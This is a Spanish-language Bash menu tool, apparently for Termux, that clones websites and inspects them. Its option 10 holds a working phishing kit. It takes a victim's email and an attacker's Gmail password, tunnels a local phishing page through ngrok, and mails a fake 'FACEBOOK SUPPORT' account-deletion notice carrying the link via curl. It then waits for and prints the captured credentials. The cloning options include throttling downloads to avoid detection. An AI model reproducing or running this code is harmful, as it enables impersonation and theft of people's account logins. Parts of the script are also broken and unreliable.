#!/bin/bash

# check internet 
function checkinternet() 
{
  ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet:${Red}CONEXIÓN FALLIDA" | lolcat
    echo 
    echo -e $red "Este script necesita una conexión a Internet Activa" | lolcat
    echo
    echo '
 --------------------------------
| SORRY  BAY  CONEXION FALLIDA  |     
 -------------------------------- 
 '| lolcat -a -d 20
    echo && sleep 5
    exit
  else
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet" | lolcat
    sleep 1
    echo -e $yellow " Conectando al Internet: ${LighGreenF}CONECTADO" | lolcat
    sleep 3
# scripting starts
clear
echo -e "Verficiando dependencias ❤ ❤ ❤ ❤ "| lolcat
echo -e "Espere por favor ❤ ❤ ❤ ❤ "| lolcat 
# Verifica si esta instaldo o lo va instalar
which lolcat > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $yellow "[ ✔ ] lolcat..............${green}[ Encontrado ]"
which lolcat > /dev/null 2>&1
sleep 3
else
echo -e $red "[ X ] lolcat  -> ${RedF} no se puedo encontrar"
echo -e $yellow "[ ! ] Desea  instalar lolcat "
sudo pip install lolcat
echo -e  "[ ✔ ] Se Instalo correctamente ...."| lolcat -a -d 30
which lolcat > /dev/null 2>&1
sleep 3
fi
# Verifica si esta instaldo o lo va instalar
which python > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $yellow "[ ✔ ] Python..............${green}[ Encontrado ]"
which python> /dev/null 2>&1
sleep 3
else
echo -e $red "[ X ] Python  -> ${RedF} no se puedo encontrar"
echo -e $yellow "[ ! ] Desea instalar python "
sudo pkg install python
echo -e  "[ ✔ ] Se Instalo correctamente ...."| lolcat -a -d 30
which python > /dev/null 2>&1
sleep 3
fi
# Verifica si esta instaldo o lo va instalar
which curl > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $yellow "[ ✔ ] curl ................${green}[ Encontrado ]"
which curl > /dev/null 2>&1
sleep 3
else
echo -e $red "[ X ] curl  -> ${RedF} no se puedo encontrar"
echo -e $yellow "[ ! ] Desea instalar curl "
sudo pkg install curl
echo -e  "[ ✔ ] Se Instalo correctamente ...."| lolcat -a -d 30
which curl > /dev/null 2>&1
sleep 3
fi
# Verifica si esta instaldo o lo va instalar
which wget > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $yellow "[ ✔ ] wget................${green}[ Encontrado ]"
which wget > /dev/null 2>&1
sleep 3
else
echo -e $red "[ X ] wget  -> ${RedF} no se puedo encontrar"
echo -e $yellow "[ ! ] Desea instalar wget "
sudo pkg install wget
echo -e  "[ ✔ ] Se Instalo correctamente ...."| lolcat -a -d 30
which wget > /dev/null 2>&1
sleep 3
fi
echo -e "PROGRAMAS REQUERIDOS SATISFECHO"| lolcat
sleep 5
clear
  fi
}
checkinternet
sleep 2

trap 'printf "\n";stop;exit 1' 2
ctrl_c() {
clear
echo -e "[*] (tecla X = x) Detectado, Saliendo... " | lolcat
sleep 2
echo -e "[*] Deteniendo el Servicio... " | lolcat
sleep 2
echo -e "[*] Deteniendo Herramientas... " | lolcat
sleep 2
echo -e "[*] Deteniendo Procesadores... " | lolcat
sleep 1
echo " "
echo -e "$grn
____  _  _  ____    ____  _  _  ___
(  _ \( \/ )( ___)  (  _ \( \/ )( ___)
 ) _ < \  /  )__)    ) _ < \  /  )__)
(____/ (__) (____)  (____/ (__) (____)..."| lolcat
echo " "
echo " "
sleep 2
echo '
 ----------------------------------
| NOS DA PENA QUE NOS DEJE CUIDASE |     
 ---------------------------------- 
 '| lolcat -a -d 20
echo && sleep 5
exit
}
clear
reset
bannerExit(){

	currentTask="bannerExit"
	clear
	$blue
	echo "Gracias por Utilizar Mis Herramientas :)"
	echo ""
	echo "luigui2120 2021"
	echo ""
	echo ""
	$cyan
	echo "Puede visitar mis proyectos en la siguiente url:"
	echo ""
	echo "https://github.com/luigui2120"
	echo ""
	echo ""

	exit

}


checkRootStatus(){

	userPriv="none"

	isRoot=$(whoami | grep root)

	case "$isRoot" in

		"root")
		userPriv="root"

	esac

	if [ "$userPriv" != "root" ]; then
		noRootAccess
	fi

}
noRootAccess(){
	$red
	echo "¡Ay! Sin acceso root!"
	$white
	echo ""
	echo ""
	echo "up no entraste en modo super usuario :("
	echo ""
	echo "Inicie sesión como usuario root y vuelva a intentarlo¡"
	echo ""
	echo ""
	echo "Precione ENTER para salir del script...."
	echo ""
	echo ""

	read pause


	bannerExit

}
color(){
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
orange='\033[40m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
Gris='\033[0;37m'
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Er5scape}[36m";
Reset="${Escape}[0m";
pe='\033[0;35m'
#-----------------

}
stop() {

printf "${Green}[${BRed}R${Green}]${BGreen} Re-Run the script\n"
printf "${Green}[${BRed}X${Green}]${BGreen} Exit\n"
read -p "Option: " guard

if [[ $guard == R || $guard == r ]]; then
sleep 1
killall -2 php > /dev/null 2>&1
killall -2 lt > /dev/null 2>&1
killall -2 xterm > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
sleep 0.5
cd Html
./retornal.sh

elif [[ $guard == X || $guard == x ]]; then
sleep 2
exit
else
exit
fi

}
Iniciar(){
sleep 3
clear
	echo "************************************************************"
	echo "DEBE ACEPTAR ESTOS TÉRMINOS ANTES DE UTILIZAR ESTE SOFTWARE!"
	echo "************************************************************"
	echo ""
	echo ""
	echo ""
        echo "Si utilzias este Script aceptas las siguiente condiciónes:"
	echo ""
	echo "1) No clonar sitios web que pertenescan a bancos"
	echo ""
	echo "2) No clonar sitios institucionales sin permiso u autorización"
	echo ""
	echo "3) Mantegamonos sobre los limites de las politicas segùn tu paìs"
	echo ""
	echo "3) El autor no se hace responsable de mal uso del script"
	echo ""
	echo "Precione "\""Y"\"" Enter para Continuar"
	echo ""

	read x

	case "$x" in
		"")
		bannerExit
		;;

		"Y" | "y")
	clear	
while :
do
echo '	
╔███╗  ╔███╗ ╔█████╗ ╔██████╗  ╔███████╗   
║██║║██║║██║ ██╔══██╗║██║  ║██ ║██╔════
║██║║██║║██║ ███████║║██║  ║██ ║███████║
║██║╚══╝║██║ ██╔══██║║██║  ║██ ║██╔════  
║██║    ║██║ ██║  ██║║██████║  ║███████║    
╚══╝    ╚══╝ ╚═╝  ╚═╝╚══════╝  ╚═══════╝ V2.2
'| lolcat -a -d 20
echo "Este script esta hecho con fines educativo"
echo  ' "Autor LUIGUI"'
echo "No todo es el estudio y no todo la diversión"
echo "equilovalo en el punto medio"
color
echo -e "$grn ＞>>＞$ylo [Options]$grn ＜<<<＜＜$rset"

echo " "
echo " "
echo -e "$grn [1] $yellow Copiar el interfast de una pagina html"
echo -e "$grn [2] $yellow Copiar una pagina completa de html vulnerando robot"
echo -e "$grn [3] $yellow Copiar html aun con restricciones"
echo -e "$grn [4] $yellow Copiar html con limite de velocidad para no ser detectado"
echo -e "$grn [5] $yellow Verificar el texto o Html"
echo -e "$grn [6] $yellow Ver linia de codigo"
echo -e "$grn [7] $yellow Modificar Html o texto"
echo -e "$grn [8] $yellow Crear texto o Html"
echo -e "$grn [9] $yellow Simulador de pagina web"
echo -e "$grn [10] $yellow Enviar al correo gmail"
echo -e "$grn [11] $yellow Mas Opciones"
echo -e "$grn [24] $yellow Exit"
echo " "
echo " "

  echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa opcion:\e[0m""\e[1;31m]\e[0m"
  read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' x
  case $x in
    1)
      echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa pagina:\e[0m""\e[1;31m]\e[0m"
      read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var 
      echo -n "Desea poner nombre a al archivo(y/n)? "
      read answer1
      clear 
      if [ "$answer1" != "${answer1#[Yy]}" ];then
      cd Descargas
      echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre con txt o html:\e[0m""\e[1;31m]\e[0m" 
      read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var6
      wget $my_var -O $my_var6.html -o /dev/null
      sleep 3
      echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
      sleep 3
      clear
      else
      if [ "$answer1" != "${answer1#[Nn]}" ];then
      cd Descargas
      wget $my_var -O index.html -o /dev/null
      sleep 5
      echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
      sleep 3
	clear
	fi
	fi
      ;;
    2)
	cd Descargas
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var8
         wget  -r -p -U Mozilla $my_var8 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;
    3)
	cd Descargas
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var9
         wget -r -k $my_var9 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;
    4)
	cd Descargas
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var10
         wget --wait=20 --limit-rate=20K -r -p -U Mozilla $my_var10 
         echo "Eso es todo, en unos minutos esto finalizara"| lolcat -a -d 20
         sleep 3
	 clear
    ;;

    5)
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mPonga el nombre:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var3
	ls -l $my_var3
	sleep 5
        clear
      ;;
    6)

       echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre :\e[0m""\e[1;31m]\e[0m" 
       read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var4
       grep 'href=' $my_var4
       sleep 10
       clear
      ;;
   7)
     echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre con txt o html:\e[0m""\e[1;31m]\e[0m" 
     read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var7
          nano $my_var7
	clear
    ;;
   8)
      echo -n "Desea crear una carpeta(y/n)? "
      read answer16
      clear
      if [ "$answer16" != "${answer16#[Yy]}" ];then 
      echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre con txt o html:\e[0m""\e[1;31m]\e[0m" 
      read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var32
      mkdir -p Html/$my_var32
      cd Html/$my_var32
	nano
      clear
      else
      cd Html
	nano
       fi
    ;;

   9)
   	cd Html
   	 reset	
	./config.sh
    ;;
    10)
	#
# Created by: Informatic_in_Termux
#
# EmailSpoofing
#
# VARIABLES
#
PWD=$(pwd)
source $PWD/Colors.sh
#
# FUNCIONES
#
trap 'printf "\n";stop;exit 1' 2
function EmailSpoofing {
sleep 0.5
echo -e -n "${verde}
┌═════════════════════════════════════════┐
█ ${blanco}INGRESE EL CORREO DE SU VÍCTIMA ${rojo}(Gmail) ${verde}█
└═════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Correo_Victima
sleep 0.5
echo -e -n "${verde}
┌═════════════════════════════════┐
█ ${blanco}INGRESE EL NOMBRE DE SU VÍCTIMA ${verde}█
└═════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Nombre_Victima
sleep 0.5
echo -e -n "${verde}
┌══════════════════════════════════════════════┐
█ ${blanco}INGRESE EL ARCHIVO QUE DESEA ENVIAR  ${rojo}(Gmail) ${verde}█
└══════════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r col
sleep 0.5
echo -e -n "${verde}
┌════════════════════════════════════════┐
█ ${blanco}INGRESE EL CORREO DEL ATACANTE ${rojo}(Gmail) ${verde}█
└════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Correo_Atacante
sleep 0.5
echo -e -n "${verde}
┌═══════════════════════════════════════════┐
█ ${blanco}INGRESE LA CONTRASEÑA DEL CORREO ATACANTE ${verde}█
└═══════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r Clave_Atacante
sleep 0.5
echo -e ""
Plantilla="Falsify"
start1
}
stop() {
VERIFICAR_NGROK=$(ps aux | grep -o "ngrok" | head -n1)
VERIFICAR_PHP=$(ps aux | grep -o "php" | head -n1)
VERIFICAR_SSH=$(ps aux | grep -o "ssh" | head -n1)
if [[ $VERIFICAR_NGROK == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $VERIFICAR_PHP == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $VERIFICAR_SSH == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

CREDENCIALES() {
echo -e "${verde}
┌════════════════════┐
█ ${blanco}CORREO ELECTRÓNICO ${verde}█
└════════════════════┘
┃
└═>>>${blanco} $usuario"
echo -e "${verde}
┌════════════┐
█ ${blanco}CONTRASEÑA ${verde}█
└════════════┘
┃
└═>>>${blanco}$clave"


echo -e "${verde}
┌═══════════════════════════┐
█ ${blanco}ESPERANDO CREDENCIALES... ${verde}█
└═══════════════════════════┘"${blanco}
}



start() {


echo -e "${verde}┌══════════════════════════════┐
█ ${blanco}GENERANDO ENLACE PHISHING... ${verde}█
└══════════════════════════════┘"${blanco}

sleep 2
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10
Enlace=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
echo -e "${verde}┃
└═>>>${blanco} $Enlace"

VERIFICAR_CREDENCIALES
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

start
}

VERIFICAR_CREDENCIALES() {
echo -e "From: 'FACEBOOK SUPPORT' <${Correo_Atacante}>
To: '${Nombre_Victima}' <${Correo_Victima}>
Subject: CUENTA PROGRAMADA PARA SER ELIMINADA DEFINITIVAMENTE

FACEBOOK

TÚ CUENTA ESTÁ PROGRAMADA PARA ELIMINARSE
DEFINITIVAMENTE.

SI INICIAS SESIÓN EN FACEBOOK EN LOS
PRÓXIMOS 30 DÍAS, TENDRÁS LA OPCIÓN
DE CANCELAR LA ELIMINACIÓN Y RECUPERAR
EL CONTENIDO O LA INFORMACIÓN QUE
AGREGASTE A TU CUENTA.

SI NO HAS SIDO TÚ EL QUE PROGRAMO LA
ELIMINACIÓN DE TU CUENTA, INICIA
SESIÓN DESDE EL SIGUIENTE ENLACE Y
CANCELA EL PROCESO.

© ${Enlace} ©

              Facebook 2020 ©" >> EmailSpoofing.txt

echo -e "${verde}
┌═════════════════════┐
█ ${blanco}ENVIANDO MENSAJE... ${verde}█
└═════════════════════┘
"${blanco}
curl -n --ssl-reqd --mail-from "FACEBOOK" -T /$col --mail-rcpt "${Correo_Victima}" --url smtps://smtp.gmail.com:465 -u "${Correo_Atacante}:${Clave_Atacante}" -T EmailSpoofing.txt

echo -e "${verde}
┌═════════════════┐
█ ${blanco}MENSAJE ENVIADO ${verde}█
└═════════════════┘"
rm EmailSpoofing.txt

echo -e "${verde}
┌═══════════════════════════┐
█ ${blanco}ESPERANDO CREDENCIALES... ${verde}█
└═══════════════════════════┘"${blanco}
while [ true ]; do
if [[ -e "Templ" ]]; then
echo -e "${verde}
┌═════════════════════════┐
█ ${blanco}CREDENCIALES CAPTURADAS ${verde}█
└═════════════════════════┘"${blanco}
CREDENCIALES
fi
sleep 0.5

done
}
EmailSpoofing
    ;;
    11)
clear
echo '	
╔███╗  ╔███╗ ╔█████╗ ╔██████╗  ╔███████╗   
║██║║██║║██║ ██╔══██╗║██║  ║██ ║██╔════
║██║║██║║██║ ███████║║██║  ║██ ║███████║
║██║╚══╝║██║ ██╔══██║║██║  ║██ ║██╔════  
║██║    ║██║ ██║  ██║║██████║  ║███████║    
╚══╝    ╚══╝ ╚═╝  ╚═╝╚══════╝  ╚═══════╝ V2.1
'| lolcat -a -d 20
echo "Este script esta hecho con fines educativo"
echo  '  "Autor LUIGUI"'
echo "No todo es el estudio y no todo la diversión"
echo "equilovalo en el punto medio"
color
echo -e "$grn ＞>>＞$ylo [Optiones]$grn ＜<<<＜＜$rset"
echo " "
echo " "    
echo -e "$grn [12] $yellow Copiar el html o texto"
echo -e "$grn [13] $yellow Mover el html o texto"
echo -e "$grn [14] $yellow Copiar carpeta"
echo -e "$grn [15] $yellow Mover carpeta"
echo -e "$grn [16] $yellow Eliminar archivo o carpeta"
echo -e "$grn [17] $yellow Descargar Imagenes"
echo -e "$grn [18] $yellow Imprimir el codigo de la url en la terminal"
echo -e "$grn [19] $yellow Sacar la información del encabezado de un sitio web HTTP"
echo -e "$grn [20] $yellow Obtener más información del sitio web"
echo -e "$grn [21] $yellow Almacenar cookies de sitio web"
echo -e "$grn [22] $yellow Acceder a los archivos que han sido modificados después de un tiempo del html"
echo -e "$grn [23] $yellow Retornar al inicio"
echo " " 
    	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa Opcion:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' vol
         if [[ $vol -eq 12 ]]; then
         echo -n "Usted guardo en carpeta (y/n)? "
	read answer
        if [ "$answer" != "${answer#[Yy]}" ] ;then
	clear 
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var12
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto o html:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var13
	 cp $my_var12/$my_var13 /sdcard/
	 reset
         else
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto o html:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var14
	 cp $my_var14 /sdcard/
	 reset
         fi 
	elif [[ $vol -eq 13 ]]; then
	echo -n "Usted guardo en carpeta (y/n)? "
	read answer33
        if [ "$answer33" != "${answer33#[Yy]}" ] ;then
	clear 
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var17
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto o html:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var16
	 mv $my_var17/$my_var16 /sdcard/
	 reset
         else
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto o html:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var15
	 mv $my_var15 /sdcard/
         reset
         fi
         elif [[ $vol -eq 14 ]]; then
         echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var18
		cp $my_var18 /sdcard/
	 reset
	 elif [[ $vol -eq 15 ]]; then
	 echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
         read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var19
	 mv $my_var19 /sdcard/
         reset
        elif [[ $vol -eq 16 ]]; then
        echo -e "$grn [1] $cyan Eliminar Archivo "f" "
	echo -e "$grn [2] $cyan Eliminar carpeta "rf""
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el codigo a eliminar:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var20
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var21
	rm -$my_var20 $my_var21
	clear
	elif [[ $vol -eq 17 ]]; then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el url de la pagina:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var31
	wget $my_var31
	sleep 6
	clear
	elif [[ $vol -eq 18 ]]; then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el url de la pagina:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var22
	curl $my_var22
	sleep 6
	clear
	elif [[ $vol -eq 19 ]]; then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el url de la pagina:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var23
        echo -n "Desea guardar registro en una carpeta(y/n)? "
	read anseer
	if [ "$anseer" != "${anseer#[Yy]}" ] ;then
        echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre para el archivo:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var31
	curl -I  $my_var23 | tee -a $my_var31.txt
	clear
	else
	curl -I  $my_var23
	sleep 8
	clear
	fi
	elif [[ $vol -eq 20 ]]; then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el url de la pagina:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var24
	curl -v $my_var24
	sleep 3.5
	clear
	elif [[ $vol -eq 21 ]]; then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el url de la pagina:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var50
        echo -n "Desea guardar registro en una carpeta(y/n)? "
	read ansee
	if [ "$ansee" != "${ansee#[Yy]}" ] ;then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var32
	mkdir $my_var32
	curl --cookie-jar $my_var32/cookies.txt $my_var50/cookies.html -O
	mv cookies.html $my_var32/
	else
	curl --cookie-jar cookies.txt $my_var50/cookies.html -O 
	fi
	sleep 3.5
	clear
	elif [[ $vol -eq 22 ]]; then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el url de la pagina:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var28
        echo -n "Desea crear carpeta (y/n)? "
	read anse
	if [ "$anse" != "${anse#[Yy]}" ] ;then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var31
	mkdir $my_var31
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la fecha d/m/a:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var29
        echo -n "Desea guardar el registro (y/n)? "
	read ans
	if [ "$ans" != "${ans#[Yy]}" ] ;then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var30
	curl -z $my_var29 $my_var28 | tee -a $my_var31/$my_var30.txt
	sleep 2
	clear
	else
        curl -z $my_var29 $my_var28
        sleep 8
        clear
         fi
	else
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la fecha d/m/a:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var29
        echo -n "Desea guardar el registro (y/n)? "
	read ans
	if [ "$ans" != "${ans#[Yy]}" ] ;then
	echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre del texto:\e[0m""\e[1;31m]\e[0m"
        read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var30
	curl -z $my_var29 $my_var28 | tee -a $my_var30.txt
	sleep 2
	clear
	else
        curl -z $my_var29 $my_var28
        sleep 8
        clear
        fi
	fi
	elif [[ $vol -eq 23 ]]; then
	cd Html
        ./retornal.sh
        fi
        
    ;;
     
   24s)
echo '
 ------------------------------------
| NOS DA PENA QUE NOS DEJE CUIDATE   |     
 ------------------------------------ 
 '| lolcat -a -d 20
echo " "
echo -e "$grn
____  _  _  ____    ____  _  _  ___
(  _ \( \/ )( ___)  (  _ \( \/ )( ___)
 ) _ < \  /  )__)    ) _ < \  /  )__)
(____/ (__) (____)  (____/ (__) (____)...$cyan Te deseo Suerte$rset"
echo " "
echo " "
exit
    ;;
    *)
      echo Comando invalido \"$x\"
     sleep 3
	reset
      ;;
  esac
done		;;

		"N" | "n")
		bannerExit
		;;
      *)
      echo Comando invalido \"$x\"
┌═════════════════════════════┐
█ echo "retorando al inicio"
└═════════════════════════════┘
	Iniciar
      ;;
  esac

}
Iniciar
color
